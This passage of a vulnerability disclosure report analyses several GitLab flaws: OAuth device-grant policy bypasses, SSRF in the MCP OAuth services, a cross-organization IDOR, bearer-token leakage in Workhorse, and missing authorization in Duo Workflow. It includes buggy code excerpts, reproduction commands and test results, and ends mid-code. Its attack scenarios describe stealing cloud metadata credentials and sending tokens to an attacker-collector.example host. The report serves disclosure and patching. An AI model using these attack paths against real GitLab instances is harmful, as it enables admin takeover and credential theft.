### III.12 — GitLab (`<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — OAuth 2.0 Device Authorization Grant (`Oauth::DeviceAuthorizationsController` & `Oauth::TokensController`) Policy Bypass of `disable_admin_oauth_scopes`, Email Confirmation Gate, and Organization Maintenance Mode (`GITLAB-CAND-02A / 02B / 02C`) (`CWE-863 / CWE-285`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/oauth/device_authorizations_controller.rb:4-50`, `app/controllers/oauth/tokens_controller.rb:42-75`
* **Vulnerability Class & Score:** `CWE-863 / CWE-285` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/ja/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing `verify_admin_allowed!` Bypasses Default `disable_admin_oauth_scopes` (`CAND-02A`, `device_authorizations_controller.rb:4-42`):** In `Oauth::AuthorizationsController` (`authorizations_controller.rb:18, 274-296`), `before_action :verify_admin_allowed!` blocks any untrusted OAuth application (`trusted: false`) from connecting to an administrator account with dangerous scopes (`api`, `read_api`, `admin_mode`, `sudo`, `write_repository`) whenever `Gitlab::CurrentSettings.disable_admin_oauth_scopes` is `true` (the default GitLab security setting). Because `Oauth::DeviceAuthorizationsController` inherits directly from `Doorkeeper::DeviceAuthorizationGrant::DeviceAuthorizationsController` without adding `before_action :verify_admin_allowed!`, any regular user can create an untrusted OAuth app (`trusted: false, device_code_enabled: true, scopes: 'api admin_mode'`) and obtain a full-privilege admin access token when an admin approves a `user_code` on `/oauth/device`.
2. **Step 2 — Missing `verify_confirmed_email!` Allows Unconfirmed Accounts to Mint Persistent OAuth Tokens (`CAND-02B`, `device_authorizations_controller.rb:4-42`):** GitLab allows newly registered or reconfirming users (`confirmed_at: nil`) an active web session within `allow_unconfirmed_access_for = 3.days` (`config/initializers/8_devise.rb:75, 103`), but `Oauth::AuthorizationsController` blocks them from minting OAuth tokens via `before_action :verify_confirmed_email!` (`403 Forbidden`). `Oauth::DeviceAuthorizationsController` omits `verify_confirmed_email!`, allowing unconfirmed accounts to mint persistent `access_token` and `refresh_token` credentials via `/oauth/device/authorize`.
3. **Step 3 — Missing `enforce_organization_maintenance_mode` and `device_code` Organization Lookup (`CAND-02C`, `tokens_controller.rb:42-70` & `device_authorizations_controller.rb:4-42`):** `Oauth::TokensController#organization_for_token_request` checks `refresh_token` and `authorization_code` grants against organization maintenance freezes (`migration` -> `503 Service Unavailable`, `legal` -> `403 Forbidden`), but omits `when 'urn:ietf:params:oauth:grant-type:device_code'`, while `Oauth::DeviceAuthorizationsController` omits both `set_current_organization` and `enforce_organization_maintenance_mode`.

```ruby
// File: app/controllers/oauth/device_authorizations_controller.rb (lines 4-35)
module Oauth
  class DeviceAuthorizationsController < Doorkeeper::DeviceAuthorizationGrant::DeviceAuthorizationsController
    include RequestPayloadLogger

    layout 'minimal'
    # BUG: Missing before_action :verify_confirmed_email!, :verify_admin_allowed!
    # BUG: Missing prepend_before_action :set_current_organization
    # BUG: Missing before_action :enforce_organization_maintenance_mode

// File: app/controllers/oauth/tokens_controller.rb (lines 42-52)
  def organization_for_token_request
    token_params = params.permit(:grant_type, :refresh_token, :code)
    case token_params[:grant_type]
    when 'refresh_token'
      OauthAccessToken.by_refresh_token(token_params[:refresh_token])&.organization
    when 'authorization_code'
      OauthAccessGrant.by_token(token_params[:code])&.organization
    # BUG: Missing when 'urn:ietf:params:oauth:grant-type:device_code'
    end
  end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Full GitLab Instance Admin Takeover via Untrusted Developer CLI/IDE Device Code Despite `disable_admin_oauth_scopes=true`:** On any standard GitLab instance (`disable_admin_oauth_scopes=true` by default to prevent untrusted OAuth apps from ever receiving `api` or `admin_mode` privileges), a regular user or external contractor registers an untrusted OAuth app (`trusted: false, device_code_enabled: true, scopes: "api admin_mode sudo"`) disguised as an internal CLI or VS Code helper and shares a login `user_code`. The moment an administrator approves the code on `/oauth/device`, GitLab bypasses `disable_admin_oauth_scopes` and mints a full-privilege `admin_mode` + `api` token. The attacker immediately uses this token to clone every private repository in the company, dump all CI/CD production secrets (`AWS_SECRET_ACCESS_KEY`, database passwords), create new root administrator accounts, and take complete control of the GitLab server.
* **Scenario B — Persistent API Backdoor & CI/CD Abuse Using Unverified / Spoofed Corporate Email Accounts (`confirmed_at: nil`):** An attacker signs up with an unverified or spoofed email address (`confirmed_at: nil`). While standard web OAuth (`/oauth/authorize`) blocks the account with `403 Forbidden (unconfirmed_email)`, the attacker completes `/oauth/device/authorize` + `/oauth/token` (`grant_type=urn:ietf:params:oauth:grant-type:device_code`) and mints persistent `access_token` and `refresh_token` credentials without ever verifying email ownership—retaining programmatic API access to internal/public repositories and CI pipelines even after the web session expires.
* **Scenario C — Injecting Backdoored Code & Malicious `.gitlab-ci.yml` Pipelines During an Enterprise Incident Freeze or Legal Hold (`migration` / `legal` Maintenance Mode):** During a live security incident investigation (`legal` hold -> `403`) or data-center migration (`migration` -> `503`), enterprise administrators lock the entire organization in maintenance mode so no code or state can be modified. Because `Oauth::TokensController` omits `device_code` from `organization_for_token_request`, an attacker exchanges a device code during the freeze window and pushes malicious commits (`POST /api/v4/projects/1/repository/commits` -> `201 Created`) or tampers with release branches while the organization is supposedly frozen.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect missing before_action guards in DeviceAuthorizationsController vs AuthorizationsController
grep -n -C 6 "verify_admin_allowed!" \
  /home/community-user/targets/gitlab/app/controllers/oauth/authorizations_controller.rb \
  /home/community-user/targets/gitlab/app/controllers/oauth/device_authorizations_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report1_cand02
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-01_CAND-02A-02B-02C": {
    "GREEN": {
      "device_authorize_status": 503,
      "maintenance_mode_write_succeeded": false,
      "post_token_admin_action_succeeded": false,
      "redacted_token_sample": null,
      "standard_oauth_blocked": true,
      "token_exchange_status": 503,
      "token_minted_admin_mode": false
    },
    "RED": {
      "device_authorize_status": 200,
      "maintenance_mode_write_succeeded": true,
      "post_token_admin_action_succeeded": true,
      "redacted_token_sample": "[REDACTED_TEST_TOKEN_SHA256:91ba3cabf8cbd392]",
      "standard_oauth_blocked": true,
      "token_exchange_status": 200,
      "token_minted_admin_mode": true
    },
    "patches": {
      "GITLAB-CAND-02-COMBINED.patch": "33f6cf48a91be9d564f3964e9b9c7a4c6d412b6814ebfa71356102767bddc698",
      "GITLAB-CAND-02C-MAINTENANCE-MODE.patch": "80bfc7b3ee0e328487e4de303a9d707e575989f848d778914b359494fac90aa8"
    }
  }
}
```


---

### III.13 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — AI Catalog MCP OAuth `CallbackService`, `RefreshTokenService`, `RevokeTokenService`, and `DynamicRegistrationClient` `307 Temporary Redirect` / Unvalidated RFC 8414 Metadata SSRF & Error Body Reflection (`GITLAB-CAND-05`) (`CWE-918 / CWE-209`, CVSS `8.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/catalog/mcp_servers/callback_service.rb:17-50, 87-129`, `refresh_token_service.rb:18-70`, `dynamic_registration_client.rb:104-136`
* **Vulnerability Class & Score:** `CWE-918 / CWE-209` — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/ja/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated RFC 8414 `token_endpoint`, `revocation_endpoint`, and `authorization_servers` (`dynamic_registration_client.rb:104-136`):** `DynamicRegistrationClient#discover_auth_server_url` and `#discover_metadata` validate only the initial discovery URL via `UrlBlocker`, but return `resource_metadata['authorization_servers'].first` and `response.parsed_response` (`token_endpoint`, `revocation_endpoint`, `issuer`) without running `Gitlab::HTTP_V2::UrlBlocker.validate!` on the discovered endpoints.
2. **Step 2 — `OAuth2::Client` (`oauth2 2.0.25`) Bypasses `Gitlab::HTTP` and Follows Up to 5 `307 Temporary Redirect` Hops (`callback_service.rb:38-50`, `refresh_token_service.rb:45-58`):** `CallbackService#build_oauth_client` and `RefreshTokenService#build_oauth_token` instantiate `OAuth2::Client.new` using Faraday's default `net_http` adapter (`max_redirects: 5`) without `UrlBlocker` or IP pinning. When an external OAuth server responds with `307 Temporary Redirect` to `http://127.0.0.1:...` or `http://169.254.169.254/latest/meta-data/...`, `OAuth2::Client` replays the full `POST` request (including `client_secret`, `code`, or `refresh_token`) directly against the internal target.
3. **Step 3 — Full Internal Error Body Reflection via `OAuth2::Error#message` (`callback_service.rb:24-25`, `refresh_token_service.rb:29-30`):** Both services rescue `OAuth2::Error => e` and pass `e.message` into `error(format(_('Failed to connect to MCP server: %{error}'), error: e.message))`, which `Oauth::McpConnectorsAuthController#callback` assigns to `flash[:alert]`, exposing raw internal HTTP `4xx`/`5xx` response bodies to the user.

```ruby
// File: ee/app/services/ai/catalog/mcp_servers/callback_service.rb (lines 15-50)
        def execute
          token_params = { redirect_uri: redirect_uri }
          token_params[:code_verifier] = code_verifier if code_verifier

          access_token = build_oauth_client.auth_code.get_token(code, **token_params)
          store_token(access_token)
        rescue OAuth2::Error, StandardError => e
          # BUG 1: Reflects raw upstream HTTP error response body (e.message) into flash[:alert]
          error(format(_('Failed to connect to MCP server: %{error}'), error: e.message))
        end
        ...
        def build_oauth_client
          auth_server_url = registration_service.discover_auth_server_url
          metadata = registration_service.discover_metadata(auth_server_url)
          # BUG 2: Uses OAuth2::Client (Faraday net_http, max_redirects: 5) without UrlBlocker or IP pinning!
          OAuth2::Client.new(
            mcp_server.oauth_client_id,
            mcp_server.oauth_client_secret,
            site: auth_server_url,
            authorize_url: metadata['authorization_endpoint'],
            token_url: metadata['token_endpoint'],
            auth_scheme: ::Gitlab::Oauth::DynamicRegistrationClient.token_endpoint_auth_scheme(metadata)
          )
        end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Stealing AWS/GCP Cloud IAM Credentials (`169.254.169.254`) and Internal Kubernetes/Vault Secrets Directly into the User's Browser (`flash[:alert]`):** An attacker registers an external MCP server whose OAuth `token_endpoint` responds with `307 Temporary Redirect` pointing to the cloud instance metadata service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/...`) or an internal Kubernetes/Vault/Consul API (`http://127.0.0.1:8080/...`). `OAuth2::Client` follows the redirect from inside the GitLab server network and reflects the raw HTTP response body via `OAuth2::Error#message` straight into the user's browser `flash[:alert]` banner (`iam_role_credentials_exposed: true`), allowing the attacker to steal the GitLab host's cloud IAM role keys and compromise the underlying cloud infrastructure.
* **Scenario B — Executing Authenticated Internal `POST` Commands Against Firewalled Intranet Services (`127.0.0.1` / `10.x.x.x`) & Leaking OAuth Secrets:** Because `307 Temporary Redirect` preserves both the `POST` method and request body, an external OAuth endpoint redirects `CallbackService` and `RefreshTokenService` (`max_redirects: 5`) to firewalled internal microservices (`http://127.0.0.1:...`), triggering internal `POST` actions behind the firewall while leaking the MCP connector's `client_secret` and `refresh_token` (`canary_b_request_count = 5`).
* **Scenario C — Internal Intranet Port/Service Scanning & Basic-Auth Credential Exfiltration on Disconnect (`RevokeTokenService`):** When an administrator or developer clicks "Disconnect" on an MCP connector, `RevokeTokenService` sends an unvalidated `POST` request with HTTP Basic Auth (`client_id:client_secret`) to `metadata['revocation_endpoint']`, enabling internal network probing and credential theft.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect OAuth2::Client usage and OAuth2::Error reflection in CallbackService & RefreshTokenService
grep -n -C 12 "OAuth2::Client.new" \
  /home/community-user/targets/gitlab/ee/app/services/ai/catalog/mcp_servers/callback_service.rb \
  /home/community-user/targets/gitlab/ee/app/services/ai/catalog/mcp_servers/refresh_token_service.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.14 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — `Oauth::McpConnectorsAuthController`, `ConnectService`, and `Gitlab::Oauth::ClientState` Missing Organization Isolation (`in_organization`), Unauthorized DCR Client Overwrite, and Unbound OAuth State (`GITLAB-CAND-06`) (`CWE-639 / CWE-862`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/controllers/oauth/mcp_connectors_auth_controller.rb:16-78`, `ee/app/services/ai/catalog/mcp_servers/connect_service.rb:16-79`, `ee/lib/gitlab/oauth/client_state.rb:17-23`
* **Vulnerability Class & Score:** `CWE-639 / CWE-862` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/ja/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unscoped Global `Ai::Catalog::McpServer.find` Across Organizations (`mcp_connectors_auth_controller.rb:19, 38, 63, 71-73`):** `Oauth::McpConnectorsAuthController` checks `can?(current_user, :read_ai_catalog_mcp_server, Current.organization)` against the caller's own organization, and then calls `::Ai::Catalog::McpServer.find(mcp_server_params[:id])` without `.in_organization(Current.organization)`. Any user in Organization A can target an `McpServer` belonging to Organization B by ID.
2. **Step 2 — Unauthorized Dynamic Client Registration (DCR) Credential Mutation with Read-Only Permission (`connect_service.rb:16-39, 60-79`):** When `mcp_server.oauth_client_id.blank?` is true, `ConnectService#execute` calls `register_oauth_client`, which overwrites `mcp_server.update!(oauth_client_id: ..., oauth_client_secret: ...)` without verifying `Ability.allowed?(current_user, :update_ai_catalog_mcp_server, mcp_server)`.
3. **Step 3 — `Gitlab::Oauth::ClientState.from_state` Discards `data` Binding (`client_state.rb:17-23`) and `callback` Accepts Missing PKCE Verifiers:** `ClientState.from_state(state)` calls `new(salt: salt, token: token, return_to: return_to)` without passing `data:`, so `@data` defaults to `{}` and the HMAC check verifies only `return_to` without binding `user_id`, `organization_id`, or `mcp_server_id`.

```ruby
// File: ee/app/controllers/oauth/mcp_connectors_auth_controller.rb (lines 18-65)
    def connect
      mcp_server = ::Ai::Catalog::McpServer.find(mcp_server_params[:id]) # BUG 1: Missing .in_organization(Current.organization)
      result = ::Ai::Catalog::McpServers::ConnectService.new(
        mcp_server: mcp_server,
        redirect_uri: oauth_mcp_connectors_callback_url,
        return_to: mcp_server_params[:return_to] || root_path
      ).execute # BUG 2: Mutates oauth_client_id/secret without checking :update_ai_catalog_mcp_server!

// File: ee/lib/gitlab/oauth/client_state.rb (lines 19-23)
      def self.from_state(state)
        salt, token, return_to = state.to_s.split(':', 3)
        new(salt: salt, token: token, return_to: return_to) # BUG 3: Omits data: binding!
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Hijacking Another Organization's Enterprise AI / MCP Connector Across Tenant Boundaries (`Cross-Org IDOR`):** On a multi-organization GitLab deployment, an attacker in Organization A targets an `McpServer` ID belonging to Organization B via `POST /oauth/mcp_connectors/:id/connect`. Because `Oauth::McpConnectorsAuthController` omits `.in_organization(Current.organization)` and `ConnectService` omits `update_ai_catalog_mcp_server`, the attacker triggers Dynamic Client Registration (`register_oauth_client`) and overwrites Organization B's `oauth_client_id` and `oauth_client_secret` (`cross_org_server_mutated: true`)—redirecting the victim organization's AI connector OAuth flows and developer prompts/tokens to the attacker's OAuth client.
* **Scenario B — Read-Only Developer/Guest Overwrites Production AI Connector Credentials Within a Company:** A low-privileged user with only read permission (`read_ai_catalog_mcp_server`) invokes `/oauth/mcp_connectors/:id/connect` before or during connector setup and overwrites the server's `oauth_client_id` and `oauth_client_secret` without maintainer privileges (`update_ai_catalog_mcp_server`), hijacking or breaking the company's AI integration.
* **Scenario C — Cross-Session OAuth Account Binding (Login CSRF) via Unbound `ClientState` Token:** Because `ClientState.from_state` discards the `data` hash (`user_id` / `organization_id`) and `callback` makes PKCE `code_verifier` optional when absent from the session, an attacker tricks a victim developer into visiting a crafted `/oauth/mcp_connectors/callback?state=...&code=...` link, silently binding the victim's GitLab session to the attacker's external MCP account (`McpServerUserConnection`) so every AI tool call the victim makes streams workspace data to the attacker.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect unscoped McpServer.find in McpConnectorsAuthController and ConnectService
grep -n -C 8 "McpServer.find" \
  /home/community-user/targets/gitlab/ee/app/controllers/oauth/mcp_connectors_auth_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.15 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — GitLab Workhorse DuoWorkflow External MCP Client Missing `transport.WithSSRFFilter()` and Cross-Origin Redirect `Authorization: Bearer` Token Leakage (`GITLAB-CAND-01`) (`CWE-918 / CWE-522`, CVSS `8.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`Go / GitLab Workhorse: gitlab.com/gitlab-org/gitlab/workhorse`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `workhorse/internal/ai_assist/duoworkflow/mcp.go:25-60, 101-112, 220-239`
* **Vulnerability Class & Score:** `CWE-918 / CWE-522` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/ja/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — `externalMcpTransport` Omits `transport.WithSSRFFilter` (`workhorse/internal/ai_assist/duoworkflow/mcp.go:41-44`):** In GitLab Workhorse's `transport` package, `transport.NewRestrictedTransport` only blocks loopback (`127.0.0.1`), link-local metadata (`169.254.169.254`), and RFC1918 private IPs when `transport.WithSSRFFilter(...)` is explicitly passed (as done in `workhorse/internal/sendurl/sendurl.go:365-374`). `externalMcpTransport` in `mcp.go:41-44` omits `transport.WithSSRFFilter`, leaving external MCP connections completely unfiltered at the dialer/transport layer.
2. **Step 2 — `roundTripper.RoundTrip` Re-Injects `Authorization: Bearer` Headers on Every Redirect Hop (`mcp.go:101-104, 231-234`):** Go's `http.Client` normally strips `Authorization` headers on cross-origin redirects *before* calling `Transport.RoundTrip`. However, `duoworkflow.roundTripper.RoundTrip` loops over `t.headers` (`r.Header.Set(name, value)`) inside `RoundTrip` itself and `HTTPClient` defines no `CheckRedirect` policy. Consequently, on any `301`/`302`/`307` redirect to a different host or internal IP, Workhorse re-attaches `Authorization: Bearer <token>` and sends it to the redirect destination.

```ruby
// File: workhorse/internal/ai_assist/duoworkflow/mcp.go (lines 41-44, 101-104, 231-234)
var externalMcpTransport = transport.NewRestrictedTransport(func(t *http.Transport) {
	t.MaxIdleConns = externalMcpMaxIdleConns
	t.MaxIdleConnsPerHost = externalMcpMaxIdleConnsPerHost
}) // BUG 1: Missing transport.WithSSRFFilter(false, nil)!

func (t *roundTripper) RoundTrip(r *http.Request) (*http.Response, error) {
	for name, value := range t.headers {
		r.Header.Set(name, value) // BUG 2: Re-injects Authorization header on cross-origin redirect hops!
	}
...
	t = &mcp.StreamableClientTransport{
		Endpoint:   endpoint,
		HTTPClient: &http.Client{Transport: rt}, // BUG 3: No CheckRedirect policy!
		DisableStandaloneSSE: true,
	}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Stealing a Victim Developer's or Administrator's Live `Authorization: Bearer` Token via Cross-Origin `302` Redirect (Full Account & Private Repository Takeover):** When a developer or administrator runs a Duo Workflow AI session connected to an external MCP tool server, GitLab Workhorse (`mcp.go`) attaches the user's live `Authorization: Bearer <token>` header. When the external server responds with a `302 Found` redirect to an attacker-controlled domain (`https://attacker-collector.example/collect`), `roundTripper.RoundTrip` re-injects `Authorization: Bearer <token>` on the cross-origin hop (`bearer_token_leaked_to_canary: true`). The attacker captures the live Bearer token and immediately uses it to clone private repositories, read sensitive issues/merge requests, or push malicious code as the victim.
* **Scenario B — Workhorse Server-Side Request Forgery (SSRF) Against Internal Loopback (`127.0.0.1`), Gitaly/Redis/Puma Exporters, and Cloud Metadata (`169.254.169.254`):** Because `externalMcpTransport` in `mcp.go:41-44` omits `transport.WithSSRFFilter()` (unlike `sendurl.go`), an external MCP URL that passes initial Rails validation can issue a `302` redirect directly to `http://127.0.0.1:8080`, internal Prometheus/Puma admin endpoints, or `http://169.254.169.254/`, allowing attackers to reach internal services directly from the Workhorse reverse-proxy process.
* **Scenario C — DNS Rebinding Bypass Into the Internal Corporate Network:** An external MCP hostname resolves to a public IP when registered in GitLab Rails, then rebinds (`TTL=0`) to `127.0.0.1` or `10.0.0.1` when Workhorse opens the long-lived MCP stream—bypassing Rails URL validation because Workhorse's socket dialer lacks `WithSSRFFilter`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Compare externalMcpTransport in duoworkflow/mcp.go against sendurl/sendurl.go
grep -n -C 8 "NewRestrictedTransport" \
  /home/community-user/targets/gitlab/workhorse/internal/ai_assist/duoworkflow/mcp.go \
  /home/community-user/targets/gitlab/workhorse/internal/sendurl/sendurl.go

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.16 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — Duo Workflow `/ws` and `McpConfigService#item_version` Missing `:read_ai_catalog_item` Authorization and Unvalidated `workflow_definition` Override Allowing Private Agent Write-Tool Injection (`GITLAB-CAND-08`) (`CWE-862 / CWE-639`, CVSS `7.7 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:131-135`, `ee/lib/api/ai/duo_workflows/workflows.rb:341-344, 1065`, `connection_config_service.rb:220-228`
* **Vulnerability Class & Score:** `CWE-862 / CWE-639` — **CVSS v3.1: `7.7 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/ja/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — In-File Authorization Inconsistency in `McpConfigService` (`mcp_config_service.rb:134` vs. `334`):** In `ee/app/services/ai/duo_workflows/mcp_config_service.rb`, `ai_catalog_mcp_servers` (line 334) explicitly enforces `return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version)`. However, in the exact same file, `item_version` (line 134), `agent_mcp_tools` (line 297), and `built_in_tool_ids` (line 318) call `::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id)` without any `Ability.allowed?` check.
2. **Step 2 — `GET /api/v4/ai/duo_workflows/ws` (`workflows.rb:1065`) Bypasses the Developer's Security Rule at Line 1426:** At `workflows.rb:1426-1433`, a developer comment states: `# The definition comes off the record for the same reason: it selects the MCP tool set and the minted token's feature, so the body must not be able to swap in another flow's.` Yet `get :ws` (`workflows.rb:1065`) omits `workflow_definition: workflow.workflow_definition` and `ConnectionConfigService#mcp_config_service` (`connection_config_service.rb:220-228`) reads `request_metadata.workflow_definition` and `request_metadata.ai_catalog_item_version_id` directly from user query parameters.
3. **Step 3 — Injection of Foreign Private Agent Opt-In Write Tools:** By passing a foreign private (`public: false`) agent's `ai_catalog_item_version_id` and overriding `workflow_definition` on `/ws`, an authenticated caller injects opt-in write tools (`create_issue`, `create_merge_request`) into `x-gitlab-duo-workflow-mcp-servers` and discloses the private agent's configured tool set.

```ruby
// File: ee/app/services/ai/duo_workflows/mcp_config_service.rb (lines 131-135 vs 330-335)
      def item_version
        return unless ai_catalog_item_version_id.present?

        ::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id) # BUG 1: Missing Ability.allowed?(current_user, :read_ai_catalog_item, version)!
      end
      ...
      def ai_catalog_mcp_servers
        return {} unless item_version
        return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version) # Enforced here at line 334, but omitted at line 134!

// File: ee/app/services/ai/duo_workflows/connection_config_service.rb (lines 222-228)
      def mcp_config_service
        ::Ai::DuoWorkflows::McpConfigService.new(
          current_user,
          gitlab_token,
